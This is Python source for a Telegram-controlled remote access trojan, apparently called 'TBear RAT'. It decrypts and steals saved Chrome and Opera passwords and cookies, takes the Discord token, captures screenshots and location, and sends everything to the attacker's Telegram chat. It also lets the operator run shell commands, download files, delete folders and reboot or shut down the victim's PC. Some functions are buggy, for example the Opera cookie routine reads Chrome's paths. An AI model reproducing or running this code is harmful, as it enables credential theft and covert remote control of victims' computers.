##############################################
# coded by romarakhlin | telegram: @rrakhlin #
##############################################

import telebot, requests
import os
import requests
from PIL import ImageGrab
import shutil
import sqlite3
import win32crypt
import subprocess
from json import loads 
import socket 
import platform
import cv2
import webbrowser  
from telebot import types


bot_token = 'BOT:TOKEN'
chat_id = 'YOUR_CHAT_ID'

bot = telebot.TeleBot(bot_token)


def Chrome():
    text = 'coded by romarakhlin\n\n\nPasswords Chrome:' + '\n'
    if os.path.exists(os.getenv('LOCALAPPDATA') + '\\Google\\Chrome\\User Data\\Default\\Login Data'):
        shutil.copy2(os.getenv('LOCALAPPDATA') + '\\Google\\Chrome\\User Data\\Default\\Login Data', os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
        
        conn = sqlite3.connect(os.getenv('LOCALAPPDATA') + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for result in cursor.fetchall():
            password = win32crypt.CryptUnprotectData(result[2])[1].decode()
            login = result[1]
            url = result[0]
            if password != '':
                text += '\nURL: ' + url + '\nLOGIN: ' + login + '\nPASSWORD: ' + password + '\n'
    return text
file = open(os.getenv('APPDATA') + '\\passwords_chrome.txt', 'w+')
file.write(str(Chrome()) + '\n')
file.close()

def Chrome_cockie():
   textc = 'coded by romarakhlin\n\n\nCookies Chrome:' + '\n'
   textc += 'URL | COOKIE | COOKIE NAME' + '\n'
   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies'):
       shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies', os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies2')
       conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies2')
       cursor = conn.cursor()
       cursor.execute("SELECT * from cookies")
       for result in cursor.fetchall():
           cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
           name = result[2]
           url = result[1]
           textc += url + ' | ' + str(cookie) + ' | ' + name + '\n'
   return textc
file = open(os.getenv("APPDATA") + '\\google_cookies.txt', "w+")
file.write(str(Chrome_cockie()) + '\n')
file.close()

def Opera():
    texto = 'coded by romarakhlin\n\n\nPasswords Opera:' + '\n'
    texto += 'URL | LOGIN | PASSWORD' + '\n'
    if os.path.exists(os.getenv('APPDATA') + '\\Opera Software\\Opera Stable\\Login Data'):
        shutil.copy2(os.getenv('APPDATA') + '\\Opera Software\\Opera Stable\\Login Data', os.getenv('APPDATA') + '\\Opera Software\\Opera Stable\\Login Data2')
        conn = sqlite3.connect(os.getenv('APPDATA') + '\\Opera Software\\Opera Stable\\Login Data2')
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for result in cursor.fetchall():
            password = win32crypt.CryptUnprotectData(result[2])[1].decode()
            login = result[1]
            url = result[0]
            if password != '':
                texto += '\nURL: ' + url + '\nLOGIN: ' + login + '\nPASSWORD: ' + password + '\n'
file = open(os.getenv('APPDATA') + '\\passwords_opera.txt', 'w+')
file.write(str(Opera()) + '\n')
file.close()

def Opera_cockie():
    textoc = 'coded by romarakhlin\n\n\nCookies Opera:' + '\n'
    textoc += 'URL | COOKIE | COOKIE NAME' + '\n'
    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies'):
      shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies', os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies2')
      conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies2')
      cursor = conn.cursor()
      cursor.execute("SELECT * from cookies")
      for result in cursor.fetchall():
           cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
           name = result[2]
           url = result[1]
           textoc += url + ' | ' + str(cookie) + ' | ' + name + '\n'
    return textoc

    file = open(os.getenv("APPDATA") + '\\opera_cookies.txt', "w+")
    file.write(str(Opera_c()) + '\n')
    file.close()

def discord_token():
    if os.path.isfile(os.getenv('APPDATA') + '/discord/Local Storage/https_discordapp.com_0.localstorage') is True:
        token = ''
        conn = sqlite3.connect(os.getenv('APPDATA') + 'discord/Local Storage/https_discordapp.com_0.localstorage')
        cursor = conn.cursor()
        for row in cursor.execute('SELECT key, value FROM ItemTable WHERE key=token'):
            token = row[1].decode('utf-16')
        conn.close()
        if token != '':
            return token
        else:
            return 'Discord exists, but not logged in'
    else:
        return 'Not found'
ds_token = discord_token()
ds_token  = 'Discord token:' + '\n' + discord_token() + '\n' + '\n'


@bot.message_handler(commands=['start'])
def send_message(command):
    bot.send_message(chat_id, '' +
                     '\n\nTo know all commands: ' + '\n/commands ' + '\nTo know about TBear RAT: ' + '\n/help', reply_markup=keyboard())

def keyboard():
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    button_1 = types.KeyboardButton('/commands')
    button_2 = types.KeyboardButton('/help')
    markup.add(button_1)
    markup.add(button_2)
    return markup

@bot.message_handler(commands=['help'])
def send_message(command):
    bot.send_message(chat_id, 'RAT-via-Telegram-Bot' + '\n\nCoded by romarakhlin' + '\nback - /start')

@bot.message_handler(commands=['commands'])
def send_message(command):
    bot.send_message(chat_id, 'commands: \n\n /screen - screenshot \n /info - info about user \n /location - location on a map \n /kill_process - kill the process (process.exe)' +
                    '\n /reboot - reboot pc \n /shutdown - shutdown pc \n /pwd - know current directory \n /passwords_chrome - chromepasswords \n /passwords_opera - operapasswords' +
                    '\n /cockies_chrome - chrome cockies' + '\n /cockies_opera - opera cockies' + '\n /get_discord - get token of Discord session' +
                    '\n /cmd command - execute command in CMD  \n /open_url - open link \n /ls - all files and folders in directory' +
                    '\n /cd - move to folder \n /download - download file \n /rm_dir - delete folder' + 
                    '\n\n /help - о RAT')

@bot.message_handler(commands=['screen'])
def send_screen(command) :
    bot.send_message(chat_id, 'Wait...')
    screen = ImageGrab.grab()
    screen.save(os.getenv('APPDATA') + '\\Sreenshot.jpg')
    screen = open(os.getenv('APPDATA') + '\\Sreenshot.jpg', 'rb') 
    files = {'photo': screen}
    requests.post('https://api.telegram.org/bot' + bot_token + '/sendPhoto?chat_id=' + chat_id , files=files)

@bot.message_handler(commands=['passwords'])
def send_passwords(message) :
    if ('{0}'.format(message.text) == '/passwords_chrome') :
        try:
            Chrome()
            bot.send_message(chat_id, 'Wait...')
            files = {'document': open(os.getenv("APPDATA") + '\\passwords_chrome.txt','rb')}
            requests.post('https://api.telegram.org/bot' + bot_token + '/sendDocument?chat_id=' + chat_id , files=files)
        except:
            bot.send_message(chat_id, 'Error!! Browser is running!')
    elif ('{0}'.format(message.text) == '/passwords_opera') :
            Opera()
            bot.send_message(chat_id, 'Wait...')
            files = {'document': open(os.getenv("APPDATA") + '\\passwords_opera.txt','rb')}
            requests.post('https://api.telegram.org/bot' + bot_token + '/sendDocument?chat_id=' + chat_id , files=files)
    else :
        bot.send_message(chat_id, 'Error!! Coomand has been entered wrong!')

@bot.message_handler(commands=['cockies'])
def send_passwords(message) :
    if ('{0}'.format(message.text) == '/cockies_chrome') :
        try:
            Chrome_cockie()
            bot.send_message(chat_id, 'Wait...')
            files = {'document': open(os.getenv("APPDATA") + '\\google_cookies.txt','rb')}
            requests.post('https://api.telegram.org/bot' + bot_token + '/sendDocument?chat_id=' + chat_id , files=files)
        except:
            bot.send_message(chat_id, 'Error!! Browser is running!')
    elif ('{0}'.format(message.text) == '/cockies_opera') :
            Opera_cockie()
            bot.send_message(chat_id, 'Wait...')
            files = {'document': open(os.getenv("APPDATA") + '\\opera_cookies.txt','rb')}
            requests.post('https://api.telegram.org/bot' + bot_token + '/sendDocument?chat_id=' + chat_id , files=files)
    else :
        bot.send_message(chat_id, 'Error!! Coomand has been entered wrong!')


@bot.message_handler(commands=['info'])
def send_info(command) :
    username = os.getlogin()
    
    r = requests.get('http://ip.42.pl/raw')
    IP = r.text
    windows = platform.platform()
    processor = platform.processor()
    
    bot.send_message(chat_id, 'PC: ' + username + "\nIP: " + IP + "\nOS: " + windows +
        '\nProcessor: ' + processor)

def internalIP():
    internal_ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    internal_ip.connect(('google.com', 0))
    return internal_ip.getsockname()[0]

@bot.message_handler(commands=['location'])
def send_info(command):
    bot.send_message(chat_id, 'Wait...')
    info = requests.get('http://ipinfo.io').text
    location = (loads(info)['loc']).split(',')
    bot.send_location(chat_id, location[0], location[1])
    import string
    import re
    response = 'External IP: ' 
    response += "".join(filter(lambda char: char in string.printable, info))
    response = re.sub('[:,{}\t\"]', '', response)
    response += '\n' + 'Internal IP: ' + '\n\t' + internalIP()

@bot.message_handler(commands=['reboot'])
def send_action(command):
    bot.send_message(chat_id, 'Wait...')
    command = os.popen('shutdown /r /f /t 0')
    response = 'Wait...'

@bot.message_handler(commands=['shutdown'])
def send_action(command):
    bot.send_message(chat_id, 'Wait...')
    command = os.popen('shutdown /s /f /t 0')
    response = 'Wait...'

@bot.message_handler(commands=['pwd'])
def pwd(command) :
    directory = os.path.abspath(os.getcwd())
    bot.send_message(chat_id, 'Current directory: \n' + (str(directory)))

@bot.message_handler(commands=['kill_process'])
def kill_process(message):	
	user_msg = '{0}'.format(message.text)
	subprocess.call('taskkill /IM ' + user_msg.split(' ')[1])
	bot.send_message(chat_id, 'Done!')

@bot.message_handler(commands=['get_discord'])
def get_discord(message):
    discord_token()
    bot.send_message(chat_id, ds_token)

@bot.message_handler(commands=['cmd'])
def cmd_command(message) : 
	user_msg = '{0}'.format(message.text)
	subprocess.Popen([r'C:\\Windows\\system32\\cmd.exe', user_msg.split(' ')[1]])
	bot.send_message(chat_id, 'Done!')

@bot.message_handler(commands=['open_url'])
def open_url(message):	
	user_msg = '{0}'.format(message.text)
	url = user_msg.split(' ')[1]
	webbrowser.open_new_tab(url)
	bot.send_message(chat_id, 'Done!')

@bot.message_handler(commands=['ls'])
def ls_dir(commands):
     dirs = '\n'.join(os.listdir(path='.'))
     bot.send_message(chat_id, 'Files: ' + '\n' + dirs)

@bot.message_handler(commands=['cd'])
def cd_dir(message):   
	user_msg = '{0}'.format(message.text)
	folder = user_msg.split(' ')[1]
	os.chdir(folder)
	bot.send_message(chat_id, 'Directory has been changes to ' + folder)

@bot.message_handler(commands =['Download'])
def download_file(message):
    user_msg = '{0}'.format(message.text)
    docc = user_msg.split(' ')[1] 
    doccc = {'document': open(docc,'rb')}
    requests.post('https://api.telegram.org/bot' + bot_token + '/sendDocument?chat_id=' + chat_id , files=doccc)

@bot.message_handler(commands = ['rm_dir'])
def delete_dir(message):   
    user_msg = '{0}'.format(message.text)
    path2del = user_msg.split(' ')[1]
    os.removedirs(path2del)
    bot.send_message(chat_id, 'Directory ' + path2del + ' deleted')

@bot.message_handler(commands = ['about'])
def about(commands):
    bot.send_message(chat_id, 'RAT-via-Telegram-Bot' + '\nCoded by nilkar')

bot.polling()

##############################################
# coded by romarakhlin | telegram: @rrakhlin #
##############################################
